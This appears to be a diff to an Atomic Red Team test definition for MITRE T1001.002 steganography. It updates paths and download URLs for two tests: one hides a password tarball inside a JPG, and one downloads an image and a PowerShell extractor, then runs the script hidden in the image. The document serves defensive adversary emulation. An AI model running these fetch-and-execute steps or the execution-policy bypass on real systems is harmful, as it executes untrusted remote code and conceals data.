@@ -1,5 +1,5 @@
 attack_technique: T1001.002
-display_name: "Data Obfuscation: Steganography"
+display_name: "Data Obfuscation via Steganography"
 atomic_tests:
   - name: Steganographic Tarball Embedding
     auto_generated_guid: c7921449-8b62-4c4d-8a83-d9281ac0190b
@@ -20,35 +20,34 @@ atomic_tests:
       image_file:
         description: Image file which will be downloaded to be used to hide data
         type: path
-        default: C:\AtomicRedTeam\atomics\ExternalPayloads\T1001.002.jpg
+        default: PathToAtomicsFolder\T1001.002\bin\T1001.002.jpg
       tar_file:
-        description: Tarz file containing data
+        description: Tarz file containing random passwords
         type: path
-        default: C:\Users\Public\Downloads\T1001.002.tarz
+        default: $env:PUBLIC\Downloads\T1001.002.tarz
       new_image_file:
         description: new image file ready for extraction
         type: path
-        default: C:\Users\Public\Downloads\T1001.002New.jpg
+        default: $env:PUBLIC\Downloads\T1001.002New.jpg
       passwords_file:
         description: Text file containing random passwords
         type: path
-        default: C:\Windows\Temp\random_passwords.txt
+        default: $env:TEMP\random_passwords.txt
     dependency_executor_name: powershell
     dependencies:
       - description: |
-          Ensure Image file is available
+          Image file must exist
         prereq_command: |
           if (!(Test-Path "#{image_file}")) {exit 1} else {
           {exit 0}
           }
         get_prereq_command: |
-          Write-Output "Creating directory for external payloads..."
-          New-Item -Path "C:\AtomicRedTeam\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+          New-Item -Type Directory (split-path "#{image_file}") -ErrorAction ignore | Out-Null
           Write-Output "Downloading image file..."
-          $imageUrl = "https://d2zp5xs5cp8zlg.cloudfront.net/image-75486-800.jpg"
+          $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg"
           Invoke-WebRequest -Uri $imageUrl -OutFile "#{image_file}"
       - description: |
-          Generate random passwords and save them to a file
+          File to hide within tarz file must exist
         prereq_command: |
           if (!(Test-Path "#{passwords_file}")) {exit 1} else {
           {exit 0}
@@ -58,7 +57,7 @@ atomic_tests:
           $passwords = 1..10 | ForEach-Object { Get-Random -InputObject ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?') -Count 12 }
           $passwords | Out-File -FilePath "#{passwords_file}"    
       - description: |
-          Ensure Tarz file is available
+          Tarz file to embed in image must exist 
         prereq_command: |
           if (!(Test-Path "#{tar_file}")) {exit 1} else {
           {exit 0}
@@ -72,8 +71,8 @@ atomic_tests:
       command: |
         Get-Content "#{image_file}", "#{tar_file}" -Encoding byte -ReadCount 0 | Set-Content "#{new_image_file}" -Encoding byte
       cleanup_command: |
-        Set-ExecutionPolicy Bypass -Scope Process -Force
-        Remove-Item -Path "#{new_image_file}" -Force
+        Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
+        Remove-Item -Path "#{new_image_file}" -Force -ErrorAction Ignore
 
   
   - name: Embedded Script in Image Execution via Extract-Invoke-PSImage
@@ -95,44 +94,40 @@ atomic_tests:
       image_file:
         description: Malicious Image file which will be downloaded
         type: path
-        default: C:\AtomicRedTeam\atomics\ExternalPayloads\evil_kitten.png
+        default: PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg
       psimage_script:
         description: Extract-Invoke-PSImage Script downloaded
         type: path
-        default: C:\AtomicRedTeam\atomics\ExternalPayloads\Extract-Invoke-PSImage.ps1
+        default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1
     dependency_executor_name: powershell
     dependencies:
       - description: |
-          Check if Malicious Image file is available
+          Image file must exist
         prereq_command: |
           if (!(Test-Path "#{image_file}")) {exit 1} else {
           {exit 0}
           }
         get_prereq_command: |
-          Write-Output "Creating directory for external payloads..."
-          New-Item -Path "C:\AtomicRedTeam\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+          New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
           Write-Output "Downloading image file..."
-          $imageUrl = "https://iili.io/JG9Lqge.png"
+          $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
           Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
       - description: |
-          Check if Extract-Invoke-PSImage script is available
+          Extract-Invoke-PSImage must exist
         prereq_command: |
-          if (!(Test-Path "#{psimage_script}")) {
-          Write-Output "Extract-Invoke-PSImage.ps1 script not found."
-          exit 1
-          } else {
-          Write-Output "Extract-Invoke-PSImage.ps1 script found."
-          exit 0
+          if (!(Test-Path "#{psimage_script}")) {exit 1} else {
+          {exit 0}
           }
         get_prereq_command: |
+          New-Item -Path "PathToAtomicsFolder\ExternalPayloads\" -ItemType Directory -Force | Out-Null
           Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
-          $scriptUrl = "https://raw.githubusercontent.com/imurasheen/Extract-PSImage/master/Extract-Invoke-PSImage.ps1"
+          $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
           Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
     executor:
       name: powershell
       elevation_required: true
       command: |
-        cd "C:\AtomicRedTeam\atomics\ExternalPayloads"
+        cd "PathToAtomicsFolder\ExternalPayloads\"
         Import-Module .\Extract-Invoke-PSImage.ps1
         $extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1"
         $scriptContent = Get-Content "$HOME\result.ps1" -Raw
@@ -147,7 +142,7 @@ atomic_tests:
         $textMatches -join '' | Set-Content -Path $scriptPath
         . "$HOME\textExtraction.ps1"
       cleanup_command: |
-        Set-ExecutionPolicy Bypass -Scope Process -Force
-        Remove-Item -Path $HOME\result.ps1 -Force
-        Remove-Item "$HOME\textExtraction.ps1" -Force
-        Remove-Item "$HOME\decoded.ps1" -Force
+        Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
+        Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore 
+        Remove-Item -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore
+        Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
